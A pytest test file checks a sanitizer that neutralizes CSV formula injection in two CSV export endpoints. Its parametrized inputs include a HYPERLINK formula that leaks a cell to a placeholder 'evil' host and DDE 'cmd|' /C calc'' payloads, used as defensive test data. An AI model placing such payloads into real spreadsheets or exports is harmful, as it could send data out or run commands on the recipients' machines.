"""
Tests for backend.services.csv_safe — the CSV/formula-injection (CWE-1236)
neutralization applied to user/tenant-controlled cells written by
GET /api/cpo/analytics/sessions.csv and GET /api/cpo/invoices.csv.

DB-free: pure string logic, no DB or event loop needed. Also includes a
lightweight static check that both CSV export endpoints actually import and
call sanitize_csv_cell — the endpoints themselves are DB-heavy (async
session + ORM rows) and are out of scope for this unit-test file.
"""
import inspect

import pytest

from backend.services.csv_safe import sanitize_csv_cell

# =============================================================================
# 1. Leading formula-trigger characters get apostrophe-neutralized
# =============================================================================

@pytest.mark.parametrize(
    "raw",
    [
        "=HYPERLINK(\"http://evil/?\"&A1)",
        "+1-800-555-0100",
        "-2+3+cmd|' /C calc'!A1",
        "@SUM(A1:A9)",
        "\tstill-a-formula",
        "\rcarriage-return-lead",
        "\nnewline-lead",
    ],
)
def test_leading_trigger_chars_get_apostrophe_prefixed(raw):
    out = sanitize_csv_cell(raw)
    assert out == "'" + raw
    assert out.startswith("'")


def test_leading_whitespace_then_trigger_is_still_caught():
    # A driver-controlled email local-part or CPO free-text field that pads
    # with whitespace before the trigger char must not slip through.
    raw = "   =cmd|' /C calc'!A1"
    out = sanitize_csv_cell(raw)
    assert out == "'" + raw
    assert out.lstrip("'").lstrip() == raw.lstrip()


# =============================================================================
# 2. Benign values pass through unchanged
# =============================================================================

def test_normal_string_is_unchanged():
    assert sanitize_csv_cell("driver@amphive.test") == "driver@amphive.test"
    assert sanitize_csv_cell("Bay 3 Fast Charger") == "Bay 3 Fast Charger"


def test_plain_number_string_is_unchanged():
    # A numeric-looking string with no leading trigger char is left as-is.
    assert sanitize_csv_cell("123.45") == "123.45"
    assert sanitize_csv_cell("0") == "0"


def test_none_becomes_empty_string():
    assert sanitize_csv_cell(None) == ""


def test_non_string_values_are_stringified():
    assert sanitize_csv_cell(42) == "42"
    assert sanitize_csv_cell(3.14) == "3.14"


# =============================================================================
# 3. Idempotence — re-sanitizing an already-neutralized cell is a no-op
# =============================================================================

@pytest.mark.parametrize(
    "raw",
    ["=cmd", "+1", "-1", "@user", "\tfoo"],
)
def test_idempotent_on_repeat_application(raw):
    once = sanitize_csv_cell(raw)
    twice = sanitize_csv_cell(once)
    assert once == twice


# =============================================================================
# 4. Endpoints actually wire the helper in (static/import check — DB-free)
# =============================================================================

def test_analytics_sessions_csv_endpoint_uses_sanitizer():
    from backend.routers.cpo import _analytics

    assert _analytics.sanitize_csv_cell is sanitize_csv_cell
    source = inspect.getsource(_analytics.cpo_export_sessions_csv)
    assert "sanitize_csv_cell(" in source


def test_invoices_csv_endpoint_uses_sanitizer():
    from backend.routers.cpo import _invoices

    assert _invoices.sanitize_csv_cell is sanitize_csv_cell
    source = inspect.getsource(_invoices.cpo_export_invoices_csv)
    assert "sanitize_csv_cell(" in source
